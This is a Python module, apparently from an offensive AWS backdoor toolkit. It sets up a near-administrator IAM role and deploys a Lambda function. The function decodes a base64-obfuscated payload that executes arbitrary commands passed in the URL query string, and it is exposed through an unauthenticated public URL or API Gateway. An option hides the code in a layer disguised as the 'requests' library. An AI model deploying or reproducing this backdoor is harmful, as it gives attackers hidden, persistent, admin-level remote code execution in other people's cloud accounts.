import argparse
import boto3
import json

from .DoorModule import DoorModule
import io
import zipfile

class AdminLambda(DoorModule):
    class Meta:
        name = 'AWS Admin Lambda'
        help = 'Create a lambda with Admin Access role exposed on the internet allowing RCE'

    def __init__(self, argv:list[str]):
        parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)
        parser.add_argument(
            '-n',
            '--name',
            help='The lambda name',
            required=True
        )
        parser.add_argument(
            '-r',
            '--role',
            help='The role name to create',
            default=None,
        )
        parser.add_argument(
            '-cr',
            '--createrole',
            help='Create the role',
            default=None
        )
        parser.add_argument(
            '-g',
            '--gateway',
            help='Use an API Gateway instead of a Lambda URL',
            action='store_true',
            default=None
        )

        parser.add_argument(
            '-l',
            '--layer',
            help='Hide the lambda code as a layer',
            action='store_true',
            default=None
        )

        args, _ = parser.parse_known_args(argv)
        if args.role is None and args.createrole is None:
            raise ValueError("Need role name, or use the createrole parameter to create a new role with Admin Access policy")
        self.role = args.role
        self.name = args.name
        self.createrole = args.createrole
        self.gateway = args.gateway
        self.layer = args.layer

    def create_lambda_role(self) -> str:
        role = ''
        iam = boto3.client('iam')
        if self.createrole is not None:
            role = self.createrole
            trust_policy = {
                "Version": "2012-10-17",
                "Statement": [{
                    "Effect": "Allow",
                    "Principal": {"Service": "lambda.amazonaws.com"},
                    "Action": "sts:AssumeRole"
                }]
            }
            policy_document = {
                "Version": "2012-10-17",
                "Statement": [
                    {
                        "Effect": "Allow",
                        "NotAction": [
                            "s3:ListBucket"
                        ],
                        "NotResource": "arn:aws:s3:::cloudtrails-logs-01032004"
                    }
                ]
            }

            print("[+] The following trust policy will be created : ")
            print(json.dumps(trust_policy, indent=2))
            print("[+] The following inline policy will be created : ")
            print(json.dumps(policy_document, indent=2))

            confirm = input("\n[+] Do you want to apply this change? (yes/no): ").strip().lower()
            if confirm.lower() not in ("yes", "y"):
                print('[-] Aborting changes, the role has not been created')
                return ''

            try:
                response = iam.create_role(
                    RoleName=self.createrole,
                    AssumeRolePolicyDocument=json.dumps(trust_policy),
                    Description=""
                )
            except Exception as e:
                print(f'[x] Failed to create the role {self.createrole}: {e}')
                return ''
            print(f'[+] Role {self.createrole} created with administrator inline policy')
            role = response['Role']['Arn']
            try:
                response = iam.put_role_policy(
                    RoleName=self.createrole,
                    PolicyName="lambda policy",
                    PolicyDocument=json.dumps(policy_document)
                )
            except Exception as e:
                print(f'[x] Failed to add the inline policy to the role {self.createrole}: {e}')
                return ''
            print(f'[+] Inline policy created and attached to the role')

        else:
            try:
                response = iam.get_role(RoleName=self.role)
            except Exception as e:
                print(f"[x] Failed to retrieve the role {self.role}: {e}")
                return ''

            role = response["Role"]["Arn"]

            trust_policy = response['Role']['AssumeRolePolicyDocument']
            trust_policy_include_lambda = False
            if type(trust_policy['Statement']) != list:
                trust_policy['Statement'] = [trust_policy['Statement']]
            for statement in trust_policy['Statement']:
                if statement['Effect'] == 'Allow' and statement['Action'] == 'sts:AssumeRole':

                    if type(statement['Principal']) == list:
                        for principal in statement['Principal']:
                            if 'Service' in principal and principal['Service'] == 'lamda.amazonaws.com':
                                trust_policy_include_lambda = True
                    elif 'Service' in statement['Principal'] and statement['Principal']['Service'] == 'lambda.amazonaws.com':
                        trust_policy_include_lambda = True

            if trust_policy_include_lambda is not True:
                trust_policy['Statement'].append({
                    "Effect": "Allow",
                    "Principal": {"Service": "lambda.amazonaws.com"},
                    "Action": "sts:AssumeRole"
                })

                print("[+] The following trust policy will be created : ")
                print(json.dumps(trust_policy, indent=2))
                confirm = input("\n[+] Do you want to apply this change? (yes/no): ").strip().lower()
                if confirm.lower() not in ("yes", "y"):
                    print('[-] Aborting changes, the policy has not been added')
                    return ''
                try:
                    iam.update_assume_role_policy(
                        RoleName=self.role,
                        PolicyDocument=json.dumps(trust_policy)
                    )
                except Exception as e:
                    print(f'[x] Failed to update the trust policy for the role {self.role}: {e}')

        return role

    def create_layer(self) -> str:
        lambda_client = boto3.client('lambda')
        layer_name = "requests_layer"
        zip_file_path = "layer.zip"
        with open(zip_file_path, 'rb') as f:
            zip_bytes = f.read()

        try:
            response = lambda_client.publish_layer_version(
                LayerName=layer_name,
                Description='',
                Content={'ZipFile': zip_bytes},
                CompatibleRuntimes=['python3.13'],
            )
        except Exception as e:
            print(f'[x] Failed to create the layer: {e}')
            return ''
        layer_arn = response['LayerVersionArn']
        print("[+] Layer created")
        return layer_arn


    def create_lambda(self, role: str, layer: str) -> str:
        lambda_client = boto3.client('lambda')

        if self.layer:
            lambda_code = '''
import requests
def lambda_handler(event, context):
    r = requests.get('https://google.com', event=event, context=context)
    return r
'''
        else:
            lambda_code = '''
import json
import base64

def lambda_handler(event, context):
    c = {'event':event, 'context':context}
    exec(base64.b64decode("aW1wb3J0IGpzb24KaW1wb3J0IHRyYWNlYmFjawppbXBvcnQgYmFzZTY0CgpjbWQgPSBOb25lCmlmICJyYXdRdWVyeVN0cmluZyIgaW4gZXZlbnQ6CiAgICBmcm9tIHVybGxpYi5wYXJzZSBpbXBvcnQgcGFyc2VfcXMKICAgIHFzID0gcGFyc2VfcXMoZXZlbnRbInJhd1F1ZXJ5U3RyaW5nIl0pCiAgICBjbWQgPSBxcy5nZXQoImNtZCIsIFtOb25lXSlbMF0KZWxpZiBldmVudC5nZXQoInF1ZXJ5U3RyaW5nUGFyYW1ldGVycyIpOgogICAgY21kID0gZXZlbnRbInF1ZXJ5U3RyaW5nUGFyYW1ldGVycyJdLmdldCgiY21kIikKCmlmIG5vdCBjbWQ6CiAgICByZXN1bHQgPSBlcnJvcgplbHNlOgogICAgcGFkZGluZyA9ICcnCiAgICB3aGlsZSBsZW4ocGFkZGluZykgPCAzOgogICAgICAgIHRyeToKICAgICAgICAgICAgY21kID0gYmFzZTY0LnVybHNhZmVfYjY0ZGVjb2RlKGNtZCArIHBhZGRpbmcpLmRlY29kZSgpCiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYWRkaW5nICs9ICc9JwoKICAgIGxvY2FsX25zID0ge30KICAgIHRyeToKICAgICAgICBleGVjKGNtZCwge30sIGxvY2FsX25zKQogICAgICAgIHJlc3VsdCA9IGxvY2FsX25zLmdldCgicmVzdWx0IiwgIk5PIE9VVFBVVCIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcmVzdWx0ID0gdHJhY2ViYWNrLmZvcm1hdF9leGMoKS5zcGxpdGxpbmVzKClbLTFd").decode(), {}, c)
    return {"statusCode": 200,"headers": {"Content-Type": "application/json"},"body": json.dumps({"a": c.get("result", "NO OUTPUT")})}
'''
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.writestr('lambda.py', lambda_code)
        try:
            response = lambda_client.create_function(
                FunctionName=self.name,
                Runtime='python3.13',
                Role=role,
                Handler='lambda.lambda_handler',
                Code={'ZipFile': buffer.getvalue()},
                Description='',
                Timeout=15,
                MemorySize=128,
                Publish=True,
                Layers=[[], [layer]][layer != '']
            )
        except Exception as e:
            print(f"[x] Failed to create the lambda function: {e}")
            return ''
        print(f'[+] Created lambda function {self.name}')
        return response['FunctionArn']

    def create_lambda_url(self) -> bool:
        lambda_client = boto3.client('lambda')
        try:
            response = lambda_client.create_function_url_config(
                FunctionName=self.name,
                AuthType='NONE',
                Cors={
                    'AllowOrigins': ['*'],
                    'AllowMethods': ['GET', 'POST'],
                }
            )
        except Exception as e:
            print(f'[x] Failed to create the lambda url config: {e}')
            return False
        try:
            lambda_client.add_permission(
                FunctionName=self.name,
                StatementId='FunctionURLAllowPublicAccess',
                Action='lambda:InvokeFunctionUrl',
                Principal='*',
                FunctionUrlAuthType='NONE'
            )
        except Exception as e:
            print(f'[x] Failed to add the url permission to the function: {e}')
            return False
        print(f'[+] Invoke URL : {response["FunctionUrl"]}')
        return True

    def create_gateway_api(self, lambda_arn:str) -> bool:
        lambda_client = boto3.client('lambda')
        apigateway = boto3.client('apigatewayv2')
        try:
            response = apigateway.create_api(
                Name='external',
                ProtocolType='HTTP',
                Target=lambda_arn,
            )
        except Exception as e:
            print(f'[x] Failed to create the gateway api: {e}')
            return False

        api_id = response['ApiId']
        invoke_url = response['ApiEndpoint']

        try:
            response = lambda_client.add_permission(
                FunctionName=self.name,
                StatementId='apigateway-invoke-permissions',
                Action='lambda:InvokeFunction',
                Principal='apigateway.amazonaws.com',
                SourceArn=f'arn:aws:execute-api:{lambda_client.meta.region_name}:{boto3.client("sts").get_caller_identity()["Account"]}:{api_id}/*/$default'
            )
        except Exception as e:
            print(f'[x] Failed to add permission to lambda: {e}')
            return False
        print(f'[+] Created API gateway')
        print(f'[+] Invoke URL : {invoke_url}')
        return True

    def run(self):
        role = self.create_lambda_role()
        if role == '':
            return
        if self.layer:
            layer_arn = self.create_layer()
            if layer_arn == '':
                return
        else:
            layer_arn = ''
        lambda_arn = self.create_lambda(role, layer_arn)
        if lambda_arn == '':
            return
        if self.gateway:
            self.create_gateway_api(lambda_arn)
        else:
            self.create_lambda_url()

